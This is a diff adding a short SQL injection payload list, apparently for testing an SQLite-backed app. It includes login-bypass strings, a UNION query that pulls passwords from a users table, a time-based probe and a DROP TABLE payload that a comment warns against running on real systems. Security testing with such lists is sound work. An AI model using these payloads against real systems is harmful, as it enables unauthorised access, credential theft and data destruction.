@@ -1,0 +1,12 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+admin' --
+' OR 'x'='x
+' OR '1'='1' /*
+" OR "1"="1
+' UNION SELECT NULL, name, password FROM users --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' AND sleep(5) --        # note: SQLite doesn't support sleep; keep for concept only
+" OR 1=1;--
+' ; DROP TABLE products; --   # Do not run destructive payloads on real systems
